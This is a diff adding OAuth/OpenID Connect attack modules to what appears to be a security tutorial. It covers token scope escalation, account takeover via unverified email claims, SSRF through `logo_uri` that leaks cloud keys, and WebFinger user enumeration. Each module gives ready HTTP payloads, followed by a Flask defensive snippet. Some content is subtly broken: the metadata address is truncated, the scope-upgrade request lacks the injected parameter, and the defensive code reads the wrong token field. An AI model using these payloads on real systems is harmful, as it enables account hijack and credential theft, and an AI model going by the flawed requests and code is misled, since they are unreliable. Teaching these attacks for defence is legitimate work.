@@ -183,11 +183,207 @@ Connection: close
 ---
 
 ### Module 05: Flawed Scope Validation & Token Privilege Escalation
-*   **CWE Mapping**: CWE-285 (Improper Authorization), CWE-915 (Improper Attribute Modification)
-*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control
 
 #### Typology A: Authorization Code Scope Upgrade
 Occurs when an attacker registers an application with the OAuth service and requests a low-risk scope (e.g., `email`). Once the victim approves the consent screen, the attacker intercepts the code/token exchange request at the `/token` phase and appends unauthorized scopes.
 
 #### 🎯 Raw Injection Payload
 ```text
+&scope=openid%20email%20profile%20admin_access
+```
+
+#### 🌐 The Injected Exploitation Request (`POST /token`)
+```http
+POST /token HTTP/1.1
+Host: oauth-authorization-server.com
+Content-Type: application/x-www-form-urlencoded
+
+client_id=12345&client_secret=SECRET&redirect_uri=https://attacker-app.com
+```
+
+#### 📄 Demo Server Response (Privileged Token Issuance)
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "access_token": "upgraded_high_privilege_bearer_token",
+  "token_type": "Bearer",
+  "expires_in": 3600,
+  "scope": "openid email profile admin_access"
+}
+```
+
+> **Why it breaks**: If the authorization server fails to match the `/token` scope parameter against the scope registered during the initial code generation phase, it mints an upgraded token containing administrative privileges.
+
+#### Typology B: Implicit Flow Scope Upgrade
+If an attacker steals an active low-privilege token, they can query the provider's resource endpoint (`/userinfo`) while manually injecting an expanded scope key into the query parameters.
+
+#### 🌐 Full Intercepted URL Request (API Parameter Tampering)
+```http
+GET /userinfo?scope=openid%20profile%20email%20extended_permissions HTTP/1.1
+Host: oauth-service-provider.com
+Authorization: Bearer STOLEN_LOW_PRIVILEGE_TOKEN
+Connection: close
+```
+
+---
+
+### Module 06: Unverified User Registration
+*   **CWE Mapping**: CWE-287 (Improper Authentication) [CWE-287]
+*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures
+
+#### Low-Level Architectural Mechanics
+This occurs when a client application delegates authentication to an identity provider (IdP) but assumes that all profile attributes are verified. If the IdP allows users to sign up and interact before validating their inbox, an attacker can build an unverified profile using a victim's email handle.
+
+#### 🎯 Raw Fraudulent Identity Response Body (The ID Token Claims)
+The attacker initiates login via the unverified account. The client backend decodes this token:
+```json
+{
+  "iss": "https://weak-identity-provider.com",
+  "sub": "user_id_attacker_controlled_999",
+  "email": "target_victim@corporate-domain.com",
+  "email_verified": false
+}
+```
+
+#### 🌐 Full Intercepted URL Request (The Backend Authentication Call)
+```http
+POST /oauth-login-callback HTTP/1.1
+Host: trusted-client-app.com
+Content-Type: application/json
+
+{
+  "provider": "weak-identity-provider",
+  "id_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6...[Claims: email=target_victim@corporate-domain.com]"
+}
+```
+
+#### 📄 Demo Server Response (Account Hijack Granted)
+```http
+HTTP/1.1 200 OK
+Set-Cookie: session=VictimAccountSessionCookieCreated; HttpOnly; Secure
+Content-Type: text/html
+
+<h1>Welcome back, Executive Administrator!</h1>
+```
+
+> **Why it breaks**: The client application backend parses the token, identifies the matching `email` field string in its database, and grants complete session control to the attacker while failing to process or reject based on the `"email_verified": false` validation flag.
+
+---
+
+### Module 07: SSRF via OpenID Dynamic Client Registration
+*   **CWE Mapping**: CWE-918 (Server-Side Request Forgery) [CWE-918]
+*   **OWASP Top 10 Reference**: A10:2021-Server-Side Request Forgery
+
+#### Low-Level Architectural Mechanics
+OpenID Connect specifications allow dynamic client registration via a dedicated endpoint (typically `/register`). When client applications register themselves, they submit configuration parameters. If the OAuth service handles metadata URIs (like `logo_uri`) unsafely, it initiates an internal backend fetch request, creating an SSRF vector.
+
+#### 🎯 Exploitation Injection Payload
+```json
+"logo_uri": "http://169.254.169"
+```
+
+#### 🌐 Full Intercepted Registration Request (`POST /register`)
+```http
+POST /openid/register HTTP/1.1
+Host: oauth-service-provider.com
+Content-Type: application/json
+
+{
+    "client_name": "Exploit App",
+    "redirect_uris": ["https://attacker.net"],
+    "logo_uri": "http://169.254.169"
+}
+```
+
+#### 📄 Demo Server Response (Exfiltrating AWS Cloud Metadata)
+```http
+HTTP/1.1 201 Created
+Content-Type: application/json
+
+{
+    "client_id": "dyn_client_84729",
+    "client_name": "Exploit App",
+    "logo_uri": "{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2026-06-19T23:30:00Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n}"
+}
+```
+
+> **Result**: The OAuth server reads the registration, creates the profile, and executes an out-of-band HTTP GET request to fetch the resource at the specified `logo_uri`. It reads the raw AWS IAM responses containing cloud security access keys and leaks them back to the attacker inside the application configuration response payload.
+
+---
+
+### Module 08: OpenID Connect WebFinger User Enumeration
+*   **CWE Mapping**: CWE-200 (Information Disclosure)
+*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control
+
+#### Low-Level Architectural Mechanics
+OpenID Connect servers often expose a standard resource discovery endpoint (`/.well-known/webfinger`). This route is designed to let clients query whether a specific user identifier exists on the Identity Provider cluster. If poorly structured, it leaks valid email formats and user existences to unauthenticated attackers.
+
+#### 🎯 Raw Injection Payload
+```text
+?resource=acct:carlos@target-company.com
+```
+
+#### 🌐 Discovery Request Injection
+An attacker parameterizes automated checks against the target OIDC router:
+```http
+GET /.well-known/webfinger?resource=acct:carlos@target-company.com HTTP/1.1
+Host: vulnerable-oauth-provider.com
+```
+
+#### 📄 Demo Server Response (Leaking Valid Account Presence)
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+    "subject": "acct:carlos@target-company.com",
+    "links": [
+        {
+            "rel": "http://openid.net",
+            "href": "https://vulnerable-oauth-provider.com"
+        }
+    ]
+}
+```
+
+> **Vulnerable Response Status**: The server answers with an HTTP `200 OK` and a structured profile schema for valid accounts but returns an HTTP `404 Not Found` for invalid inputs, creating a reliable method for targeting system user handles.
+
+---
+
+## 🛡️ OAuth Defensive Coding Blueprint
+
+```python
+import jwt
+import requests
+from flask import abort, session, request
+
+# 1. Enforce strict exact-string validation lists
+WHITELISTED_CALLBACKS = ["https://trusted-client.com"]
+
+def validate_redirect(uri):
+    if uri not in WHITELISTED_CALLBACKS:
+        return abort(400, "Invalid Redirect URI")
+
+# 2. Secure Server-Side Identity Verification & Scope Cross-Check
+@app.route('/oauth-login-callback', methods=['POST'])
+def secure_login():
+    payload = request.get_json()
+    id_token = payload.get('token')
+    
+    try:
+        # Cryptographically decode and verify public JWKS key signatures
+        decoded_claims = jwt.decode(id_token, PROVIDER_PUBLIC_KEY, algorithms=["RS256"], audience="our_app")
+        
+        # Enforce Email Verification Checks
+        if not decoded_claims.get('email_verified', False):
+            return abort(401, "Unverified Identity Claims Blocked")
+            
+        # Establish session explicitly from cryptographically secure claims
+        session['user_email'] = decoded_claims.get('email')
+        return "Authenticated", 200
+        
+    except jwt.exceptions.InvalidTokenError:
+        return abort(401, "Signature Verification Failure")
+```
